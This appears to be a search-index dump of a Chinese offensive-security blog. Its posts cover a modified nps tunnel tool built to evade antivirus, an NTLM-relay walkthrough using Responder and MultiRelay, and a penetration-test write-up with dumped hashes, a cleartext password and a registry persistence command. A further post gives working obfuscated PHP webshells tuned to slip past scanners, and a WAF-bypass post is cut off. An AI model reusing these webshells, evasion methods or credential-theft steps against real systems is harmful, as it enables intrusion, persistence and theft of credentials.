defender，是无法进行点击的。\n\n参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44216796&#x2F;article&#x2F;details&#x2F;112118108\n\n","slug":"内网远程控制总结","date":"2023-05-26T09:25:44.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"badd5d9a02640c51cb699c12c4298740","title":"关于nps工具的魔改","content":"免责声明🧐[]: \n本工具仅面向 合法授权 的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。\n在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。\n如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。\n在安装并使用本工具前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。\n工具来源及其说明（1）nps通信流量比较稳定，但特征抓的比较死，所以基于原版的nps进行二次开发\n\n说明为了工具的免杀性及其后期修改，本人不公开源码。 本人承诺，工具无毒，只能简单进行二开\n魔改部分（1）重写了nps的认证过程，通信过程均进行加密\n（2）重些了npc的部分，预计后续分离config文件进行加载\n（3）进行了nps未授权漏洞的修复，避免了默认配置未授权\n（4）支持config文件从远端进行加载，在传输过程中均实现流量加密\n\n免杀情况（这是魔改后的demo上去的，还请各位测试切莫进行☁️测试、沙箱测试、联网测试）\n魔改后流量魔改后的工具流量就不进行抓取了，需要的话，大家可以自行进行测试。\n某社区☁️沙箱（demo版测试）\nvirustotal\nwindows defender（静态）\nwindows defender（动态）\n360、火绒等其他杀软未进行测试项目使用未进行测试nps服务端的注册，所以目前主要还是 .&#x2F;nps的方式来运行\n服务端使用客户端使用配置文件启动配置文件如下：\n[common]\nserver_addr&#x3D;127.0.0.1:8024\nconn_type&#x3D;tcp\nvkey&#x3D;123456\nauto_reconnection&#x3D;true\nmax_conn&#x3D;1000\nflow_limit&#x3D;1000\nrate_limit&#x3D;1000\nweb_username&#x3D;admin\nweb_password&#x3D;123\ncrypt&#x3D;true\ncompress&#x3D;true\n#pprof_addr&#x3D;0.0.0.0:9999\ndisconnect_timeout&#x3D;60\n\n\n命令行启动\n命令行以远端配置文件启动npc.exe -rconfig ServerConfig地址\neg.\nnpc.exe -rconfig 127.0.0.1:23123\n\n项目进度✅ 2023.5.19 重新写了通信认证协议\n✅ 2023.5.20 把连接流量进行混淆，仅仅支持客户端命令行启动，未支持conf文件启动\n✅ 2023.5.21 支持本地config文件加载\n✅ 2023.5.23 支持config文件仅从服务端拉取\n后续增加（1）实现其他协议流量的魔改\n参考https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps\n\n\n\n\n\n配置有很多师傅在github issue中提出项目无法启动，报错等问题。这里给出一个服务端配置以及客户端启动来进行连接测试。本项目终止维护（可能后期会自己写反向代理（比较菜鸡））\n这里下载https://github.com/Q16G/npsmodify/tree/main/cmd/nps中的conf和web到当前目录。\n\n将对应的版本拉下来。和对应目录同级。\n\n这里去conf中进行配置，conf中配置good.conf\n\ngood.conf图\n\n连接服务端。配置火狐，正常使用就好。（这里仅仅测试了windows、linux应该同样配置也可以上线）\n\n","slug":"关于nps工具的魔改","date":"2023-05-26T07:52:53.000Z","categories_index":"","tags_index":"工具魔改","author_index":"Q16G"},{"id":"87b274fadad0a6b05fd4814550be9f11","title":"NTLM-Relay攻击","content":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。\n而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。\nNTLM协议介绍NTLM协议分为几个部分。 协商、挑战、认证。也叫做挑战响应机制。\n协商：这个是为了解决历史遗留问题，为了向下兼容设计，双方协定一下传输的版本号等各种信息，版本主要分为V1和V2两个版本。\n挑战：如下图。\n认证：对质问结果的验证，验证通过后即可访问资源。\n\n\n工作组中进行挑战过程：（Netlogon协议）（1）客户端向服务器发出登陆请求。\t\n（2）服务器返回一个challenge，包含一个随机数和一个称为realm的字符串。\n（3）客户端使用账号密码和challenge计算出一个respose，然后发送给服务器。\n（4）服务器使用账号密码计算出来一个expected-respose。\n（5）服务器将生成的expected-respose和repose进行对比，如果一致则认证通过。\n\n\n域环境挑战全过程：1.由于域机器中的SAM文件中，不存在域内用户的hash值，所以域内机器将客户端的username、challenge、repose通过netlogon协议交到域控手中，让域控进行身份认证。\n2.域控通过客户端用户名在自己的ntds.dit中进行寻找，用challenge进行加密，再和net-ntlm-hash进行对比，返回结果给域机器\n3.服务器根据DC的结果成功与否返回给客户端\n\n\n\n本地抓包测试这里起了两个windows虚拟机，这里左侧已经连接上去，这里wireshark看下流量包\n\n这里wireshark抓到smb2的数据包\n\n这里可以看到172.16.165.130是相当于登陆机器，由于是非域内环境，所以只能按照本地网络认证的过程来执行，这里会先进行协商，确定版本号，然后进行challenge。\n\n这里服务端会向客户端返回16位的随机数challenge。\n\n然后客户端向要登陆的主机发送用户名对应的NTLMHASH对challenge进行加密得到的Respose。\n\n将获取到的Respose进行Net-NTLMhash格式的拼接。\nNET-NTLMhash格式：\n username:domain:challenge:HMAC-MD5:blob\n \n详细说明一下各个数据的获取：\nusername和domain都可以从下图过程中进行获\nHMAC-MD5为NTProofStr部分（正在username和domain获取中得到）\nblob就是Response中除NTProofStr剩下的部分\n\nusername、domain的获取\n所以当你拼接完成之后，就可以用hashcat来进行解密完成密码的获取。\nNTLM-Relay前置知识windows系统名称的解析顺序当我们访问一个共享时， net use \\aa 其寻找这个主机名会按顺序来进行查找。\n（1）本地的host文件\n（2）DNS的缓存\\DNS服务器\n（3）链路本地多播和NetBios名称服务\n\n如果在1、2中没有找到，系统就会通过链路本地多播名称解析和NetBios名称服务在本地名称解析。这个时候，客户端就会将未经过认证的UDP广播到网络中，询问他是否是本地系统的服务，由于改过程未经过认证，并未广播到整个网络中，从而允许网络上的任何机器响应并声称是这台机器。\n因为当用户输入的不存在、包含错误或者DNS中没有主机名的时候，通过responder工具监听链路本地多播名称解析和Net-BIOS广播，就可以伪装目标机器，从而让受害者交凭证。\nresponder攻击详解Responder工具是一款用于中间人攻击的工具，他可以用于监听本地网络并获取许多凭证，例如NTLM和kerberos凭证。\n--version             显示程序版本并退出\n-h, --help            显示帮助信息并退出\n-A, --analyze         分析模式。此选项允许您查看NBT-NS、BROWSER、LLMNR请求，而无需响应。\n-I eth0, --interface&#x3D;eth0\n要使用的网络接口，可以使用“ALL”作为通配符来表示所有接口\n-i 10.0.0.21, --ip&#x3D;10.0.0.21\n要使用的本地IP（仅适用于OSX）\n-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6&#x3D;2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed\n使用与Responder的IPv6地址不同的另一个IPv6地址扰乱所有请求。\n-e 10.0.0.22, --externalip&#x3D;10.0.0.22\n使用与Responder的IP地址不同的另一个IP地址扰乱所有请求。\n-b, --basic           返回基本的HTTP身份验证。默认值：NTLM\n-d, --DHCP            启用对DHCP广播请求的答复。此选项将在DHCP响应中注入WPAD服务器。默认值：False\n-D, --DHCP-DNS        此选项将在DHCP响应中注入DNS服务器，否则将添加WPAD服务器。默认值：False\n-w, --wpad            启动WPAD恶意代理服务器。默认值为False\n-u UPSTREAM_PROXY, --upstream-proxy&#x3D;UPSTREAM_PROXY\nWPAD代理的上游HTTP代理用于发出请求（格式：host:port）\n-F, --ForceWpadAuth   强制进行wpad.dat文件检索的NTLM&#x2F;Basic身份验证。这可能会导致登录提示。默认值：False\n-P, --ProxyAuth       强制NTLM（透明）&#x2F; Basic（提示）身份验证进行代理。不需要启用WPAD。此选项非常有效。默认值：False\n--lm                  强制Windows XP&#x2F;2003及更早版本使用LM哈希降级。默认值：False\n--disable-ess         强制ESS降级。默认值：False\n-v, --verbose         增加详细程度。\n\nNTLM-Relay攻击\n最重要的意思，攻击者利用网络监听或者其他方式盗取认证凭据，之后再重新把他发送给server。\n实战操作这里下载responder，输入命令\npython3 responder -I etho -f \n\n受害机器执行操作\n\n\n成功收到ntlm的hash值，但是这个是比较鸡肋的，当我们破解不出来密码的时候就显得没有作用。\n另类的NTLM-Repay但是我们可以将凭证中继到其他主机上去，如果在域内的权限足够大，则可以中继到其他主机上去，获取其他主机权限，但是不能relay到真实的主机上去。但是也有一定的前提条件，就是目标主机不能开启smb签名。一般在域内，域控默认打开smb签名，但是域内的机器是不打开smb签名的。\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Lanmanworkstation\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\n\n（1）使用脚本进行探测Runfinger脚本探测主机：\n使用responder&#x2F;tools文件夹下的有一款工具叫做RunFinder工具，这里用它来进行内网探测哪台主机可以使用NTLM-Relay攻击，但是这里的runfinger只能在域内进行使用，由于环境限制，我就再进行探测。\n注意事项：\n即使有一个主机，你知道可以进行攻击，但是没有被runfinger显示出来，也不可以进行攻击。\n\n（2）修改responder的配置文件responder.conf，不让其对hash进行抓取。将SMB和HTTP的ON改为Off：\nvim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf\n\n（3）开启responder的监听\nresponder -I eth0 -v\n\n（4）启动MultiRelay.py\ncd &#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools\npython3 MultiRelay.py -t  要攻击的域内目标  -u ALL\npython3 MultiRelay.py -t 192.168.52.171 -u ALL\n\n\n\n\nntlm-relay的触发方式只有域中其他用户访问了一个错误的主机，那么我们作为攻击者就可以触发可以进行NTLM-relay攻击。\n通过http协议触发\n通过SMB协议触发net use \\\\错误的名称\n\n\n收集到的奇怪的触发方式通过xss来进行触发\n&lt;script src&#x3D;\\\\aa&gt;&lt;&#x2F;script&gt;\n\n","slug":"NTLM-Relay攻击","date":"2023-05-24T04:12:28.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"6926437034a0cc884741b3438fbe3704","title":"关于某次授权的大型内网渗透测试","content":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。\n背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。\n前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。\n\n\ntasklist查看杀软System Idle Process              0 N/A                                         \nSystem                           4 N/A                                         \nsmss.exe                       240 N/A                                         \ncsrss.exe                      376 N/A                                         \nwininit.exe                    436 N/A                                         \nservices.exe                   524 N/A                                         \nlsass.exe                      532 Kdc, KeyIso, Netlogon, NTDS, SamSs          \nsvchost.exe                    672 BrokerInfrastructure, DcomLaunch, LSM,      \n                                   PlugPlay, Power, SystemEventsBroker         \nsvchost.exe                    716 RpcEptMapper, RpcSs                         \nWRSA.exe                       820 WRSVC                                       \nsvchost.exe                    276 Dhcp, EventLog, lmhosts, Wcmsvc             \nsvchost.exe                    320 Appinfo, BITS, CertPropSvc, gpsvc, IAS,     \n                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    \n                                   Schedule, seclogon, SENS, SessionEnv,       \n                                   ShellHWDetection, Themes, Winmgmt           \nsvchost.exe                    516 EventSystem, FontCache, netprofm, nsi,      \n                                   W32Time, WinHttpAutoProxySvc                \nsvchost.exe                    932 CryptSvc, Dnscache, LanmanWorkstation,      \n                                   NlaSvc, WinRM                               \nsvchost.exe                   1100 BFE, DPS, MpsSvc                            \nspoolsv.exe                   1508 Spooler                                     \nMicrosoft.ActiveDirectory     1540 ADWS                                        \nOfficeClickToRun.exe          1792 ClickToRunSvc                               \nsvchost.exe                   1844 ddpvssvc                                    \ndfsrs.exe                     1892 DFSR                                        \nsvchost.exe                   1908 DHCPServer                                  \nsvchost.exe                   1936 DiagTrack                                   \ndns.exe                       1980 DNS                                         \nfmaonsite.exe                 2024 FMAuditOnsite                               \nismserv.exe                   1340 IsmServ                                     \nMicrosoft.BDD.MonitorServ     1432 MDT_Monitor                                 \nMSOIDSVC.EXE                  2660 msoidsvc                                    \nsvchost.exe                   2328 Net Driver HPZ12                            \nOpenDNSAuditService.exe       2220 OpenDNS Active Directory Service            \nMSOIDSVCM.EXE                 1256 N/A                                         \nsvchost.exe                   2172 Pml Driver HPZ12                   \nScreenConnect.ClientServi      556 ScreenConnect Client (62c0d7e1d3b94bc5)     \nsvchost.exe                   1472 TermService                                 \nOpenDNSAuditClient.exe        2924 N/A                                         \nconhost.exe                   1380 N/A                                         \nVGAuthService.exe             2096 VGAuthService                               \nvmtoolsd.exe                   612 VMTools                                     \nWRCoreService.x64.exe         2136 WRCoreService                               \nWRSkyClient.x64.exe           3180 WRSkyClient                                 \ndfssvc.exe                    3316 Dfs                                         \nWmiPrvSE.exe                  3484 N/A                                         \nsvchost.exe                   3568 UALSVC, UmRdpService                        \nVeeamDeploymentSvc.exe        3612 VeeamDeploySvc                              \nWRSvcMetrics.x64.exe          3580 N/A                                         \nsvchost.exe                   4216 PolicyAgent                                 \nmsdtc.exe                     4160 MSDTC                                       \nDCA.Edge.Console.exe          3676 DCAPulse                                    \niashost.exe                   4548 N/A                                         \nwsmprovhost.exe               9104 N/A                                         \npowershell.exe                7828 N/A                                         \nconhost.exe                   6688 N/A                                         \npowershell.exe                 360 N/A                                         \nconhost.exe                   5152 N/A                                         \nnotepad.exe                   1760 N/A                                         \nLTSvcMon.exe                  5424 LTSvcMon                                    \nLTSVC.exe                     7272 LTService                                   \nlabvnc.exe                    5412 tvnserver                                   \nVeeam.EndPoint.Service.ex     8316 VeeamEndpointBackupSvc                      \nwsmprovhost.exe               7108 N/A                                         \nScreenConnect.WindowsBack     4384 N/A                                         \ncsrss.exe                     7564 N/A                                         \nwinlogon.exe                  5520 N/A                                         \ndwm.exe                       6572 N/A                                         \nlabvnc.exe                    5916 N/A                                         \ntaskhostex.exe                8540 N/A                                         \nWRSA.exe                      2308 N/A                                         \nScreenConnect.WindowsClie     3732 N/A                                         \nexplorer.exe                  3964 N/A                                         \nMRT.exe                       4852 N/A                                         \nvm3dservice.exe               2656 N/A                                         \nMRT.exe                       5196 N/A                                         \nvmtoolsd.exe                  5340 N/A                                         \nDCA.Edge.TrayIcon.exe         6432 N/A                                         \nLTTray.exe                    4564 N/A                                         \nWmiPrvSE.exe                  6336 N/A                                         \nTaskmgr.exe                   6684 N/A                                         \nLogonUI.exe                    380 N/A                                         \ncmd.exe                       2400 N/A                                         \nconhost.exe                   6216 N/A                                         \nnet.exe                       8100 N/A                                         \nnet1.exe                      8908 N/A                                         \ncmd.exe                       2956 N/A                                         \nconhost.exe                   8300 N/A                                         \nnet.exe                       7344 N/A                                         \nnet1.exe                      5248 N/A                                         \ncmd.exe                        432 N/A                                         \nconhost.exe                   9052 N/A                                         \nnet.exe                       7356 N/A                                         \nnet1.exe                      3156 N/A                                         \ncmd.exe                       8232 N/A                                         \nconhost.exe                   4600 N/A                                         \nnet.exe                       5528 N/A                                         \nnet1.exe                      7352 N/A                                         \ncmd.exe                       4304 N/A                                         \nconhost.exe                   7148 N/A                                         \nvds.exe                       3872 vds                                         \ncmd.exe                       7716 N/A                                         \nconhost.exe                   8564 N/A                                         \ntasklist.exe                  9212 N/A   \n\n内网渗透：边缘机的systeminfo因为前期拿到了边缘机，这里查看systeminfo,发现是2012R2的主机。\n\n边缘机提权：（利用烂土豆直接提上权限）提权之后做进程迁移，直接把进程迁移到lsass进程中去。\n\n内网信息收集：先查看ip，看是否存在双网卡机Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : CAMS-SQL3\n   Primary Dns Suffix  . . . . . . . : AVV.org\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : AVV.org\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-98-E3-D6\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::a5b1:d534:730:3123%11(Preferred) \n   IPv4 Address. . . . . . . . . . . : 10.2.0.49(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n\n进行域管理员和域控的查看：域控：net group “domain controllers” &#x2F;domain\n[04/26 18:16:59] beacon> shell net group \"domain Controllers\" /domain\n[04/26 18:17:00] [*] Tasked beacon to run: net group \"domain Controllers\" /domain\n[04/26 18:17:00] [+] host called home, sent: 69 bytes\n[04/26 18:17:00] [+] received output:\nThe request will be processed at a domain controller for domain FPC.LOCAL.\n\nGroup name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAVV-DC1$                 AVV-DC2$                 AVV-DHDC01$              \nAVV-DHDC02$                    \n\n域管：net group “domain admins” &#x2F;domain\nfpcadmin                 mqd.ns          \nmqd.rmm                  mqd.tdv  \n\n前直接归属的域控和主域控：net time &#x2F;domain\n[04/26 18:27:52] beacon> shell net time /domain\n[04/26 18:27:52] [*] Tasked beacon to run: net time /domain\n[04/26 18:27:52] [+] host called home, sent: 47 bytes\n[04/26 18:27:54] [+] received output:\nCurrent time at \\\\AVV-DC2.FPC.LOCAL is 4/26/2023 5:27:53 AM\n\n可以发现当前是直接被DC2所归属，这里查下主控制器。这里直接使用CS插件来进行渗透\n[04/26 18:31:11] [+] =========== 查看主域控制器 ==========\n[04/26 18:31:12] [*] Tasked beacon to run: netdom query pdc\n[04/26 18:31:12] [+] host called home, sent: 47 bytes\n[04/26 18:31:14] [+] received output:\nPrimary domain controller for the domain:\n\nAVV-DC1\nThe command completed successfully.\n\n定位域控的IP地址：这里经过ping之后发现，域控不是都在同一个网段，应该是如下的结构。\n\n内网存活主机探测：我先进行了DC段和本机段存活主机的探测，这里直接利用cs的插件（portscan）\nportscan 10.2.0.0/24\nportscan 10.2.92.30/24\nportscan 10.6.0.10/24\nportscan 10.11.1.12/24\n\n\nfscan扫描本机C段：潦草的扫描到了ftp的匿名登陆，没有扫描到其他有用信息。这里就不放其他几个段的截图，都没扫描到啥有用的信息。\n\n做hashdump：这里直接做完hashdump之后发现\nmsv :   \n     [00000003] Primary\n     * Username : mqd.tdv \n     * Domain   : FPC\n     * NTLM     : 7007ebae678042f1cf112578ac43bf68\n     * SHA1     : 712ce4bf3a4a777582389d37f8d06158ed204f6b\n    tspkg : \n    wdigest :   \n     * Username : mqd.tdv \n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    kerberos :  \n     * Username : mts.tdv\n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    ssp :   \n    credman :   \n\n内网横向（因为自己失误造成了比较繁琐的过程）因为前期已经看到了域管的账号就是mqd.tdv，这里直接做密码喷洒，这里转到msf中看下。上线了如此多的主机，同时，DC2子域控也进行了上线\n第一天上线的主机：(MSF上)\nCS上：（上线74台）\n小插曲：因为渗透到域控的时候，在半夜2点半，所以在拿到DC2的权限的时候，就直接关掉电脑睡觉啦，没有进行留后门和做进程注入，导致第二天上线的时候执行命令出现如下界面。\n这里的意思就是启动新进程的时候，系统无法将当前进程的令牌传递给新进程。也就是无法创建进程，所以只能通过其他方式来进行横向渗透。并且后期发现该域管理员密码已经进行修改。\nDC挂掉之后的想到的几种方式：（1）抓去已控主机的hash看是否有其他域管登陆（失败）因为前面已经拿到了100多台机子的权限，所以能想到的第一个思路就是把100多台主机上的hash都进行一个抓起取，然后看是否可以抓到域管的账号，但是这里抓完之后会发现，没有一台域管是上线的，所以这里也比较无语。\n\n（2）利用CVE漏洞来进行横向（失败）因为之前探测到DC的版本是windows2012 R2版本，所以想到了用ms17-010来进行内网横向，但是这里经过检测之后发现也没有ms17-010的漏洞，所以无法进行横向\n\n（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）这里经过尝试CVE-2020-1472漏洞，也没有发现可以横向上去，通过poc检测发现是fail的。\n\n（4）尝试攻击exchange服务器，来中继攻陷主机（失败）这里就不放细节了，均以失败告终。\n峰回路转：（DC2子域控上线）DC2子域控上线过程：这里经过一天的折磨之后发现，以上的几种方式不好使，但是想到了抓取机器用户的hash，通过构造密码表，来进行域管的密码喷洒，这里抓取了100多个的机器用户和几个域内用户做成密码表，重新进行内网横向。\n这里截图部分域内用户，做成密码表后直接进行喷洒，发现域管成功上线。\n\n\n\nDC2子域权限维持：（1）把当前进程注入到lsass进程中去。\n（2）reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"start\" /d \"C:\\Windows\\Temp\\start.exe\"  //开机自启动\n（3）添加域管理员，因为已经拿到域管理员的权限，所以可以添加域管理员，来进行权限维持（这里直接通过lstar的插件来进行域管理员的添加）\n\n其他域控上线这里也是一个小Tip，也是提供给大家的一个思路\n在有权限的情况下，可以添加域管理员，然后通过域管理员来进行横向其他域控（这是仅限于一个域），但是上面给出来了结构，这个域都是在一个域内的，所以的话，就可以进行添加管理员来上线。这里直接放后期上线的域控。\n\n总结：经过这次实战总结了很多小的技巧。\n（1）可以通过添加域管理员来上线域内的所有主机\n（2）可以通过cs来进行进程注入or进程迁移，来实现本机system权限的获取\n（3）此次实战的密码喷洒尤为重要，所以有机器用户的hash一定要进行抓取\n（4）SPN服务横向可以通过打邮服来进行获取域控权限\n（5）学习了权限维持的方法（开机自启动、winrm的横向和psexec的横向）\n\n恶补了一大波内网知识（比靶场来的实在）\n\n不足之处：\n（1）此次通过内网渗透，虽然打了邮件服务器，但是没有通过邮件服务器来拿下DC的权限。\n（2）没有通过SPN票据横向拿下对应的服务器，比如MSSQL的和CIFS的\n（3）此次没有利用白银票据进行横向（得重新学习）\n","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"0bde8e350134ac3c0961afd29aadf7f8","title":"phpwebshell免杀","content":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。\n0x01 蚁剑介绍及其改编：关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。\n但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。\n蚁剑默认流量返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。\n默认的base64编码器但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。\n去github上找到蚁剑的编码器和对应的解码器github地址:（编码器）这里下载默认的aes-128的默认流量。\n默认编码器的webshell\n&lt;?php\n@session_start();\n$pwd='ant';\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));\n?>\n\n默认webshell讲解：这里打开session_start，然后截取Cookie中的PHPSESSION的16位。\n然后进行aes加密，密码为pwd\n\n再D盾，河马和阿里云进行扫描：\n河马没有查出来，可能是比较弱阿里云直接报恶意\n\n初步修改后的webshell：&lt;?php\n@session_start();\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction decode($key,$data)&#123;\n$data_new = '';\nfor($i=0;$i&lt;=strlen($data);$i++)&#123;\n$b=$data[$i]^$key;\n$data_new = $data_new.urldecode($b);\n&#125;\ndefine('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);\ndefine('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');\nreturn $data_new;\n&#125;\nfunction decrypto($key,$data)&#123;\n$data = base64_decode($data);\n$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);\ndecode('\\\\','=:=om>n?o8h9i:j;k*d0e.l/m(');\n$ass=ass;\n$ass(ev);\n&#125;\nclass run&#123;\n    public $data;\n    public function __construct()&#123;\n$this->data = '#````````#'.$_POST[1].\"#`#`#\";\n$this->data = $this->data.\"123456\";\n&#125;\n&#125;\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n$run = new run();\ndecrypto($key,$run->data);\n?>\n\n这里能过去D盾，但是无法绕过阿里云查杀。\n所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）\n混淆之后的webshell：这里提供php在线加密的站\nhttps://enphp.djunny.com/\n\n这里加密之后生成webshell。如下：\ngoto Zc4oD; UJih6: function decrypto($key, $data) &#123; goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, \"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode(\"\\x5c\", \"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: &#125; goto DGZMG; WvjFi: ini_set(\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\", \"\\117\\146\\x66\"); goto Wguwk; DGZMG: class run &#123; public $data; public function __construct() &#123; $this->data = \"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\" . $_POST[1] . \"\\x23\\140\\x23\\140\\43\"; &#125; &#125; goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, \"\\141\"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) &#123; goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define(\"\\141\\x73\\x73\", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define(\"\\x65\\166\", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . \"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i &lt;= strlen($data))) &#123; goto RuTl1; &#125; goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: &#125; goto UJih6; apKNY: decrypto($key, $run->data);\n\n经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。\n已经成功绕过阿里云查杀。用burpsuite抓下流量特征。\n从流量加密来分析的话，已经能绕过态势感知和全流量分析机。\n蚁剑UA头的修改：在burp的数据包中能清楚的看到蚁剑的特征\n在目录&#x2F;modules&#x2F;request.js文件中修改UA头\n&#x2F;modules&#x2F;update.js文件修改\n0x03 总结：关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。\n","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","categories_index":"","tags_index":"免杀","author_index":"Q16G"},{"id":"cf78fa225b6de7abf9eac61bd71ce650","title":"waf绕过-打狗棒法","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 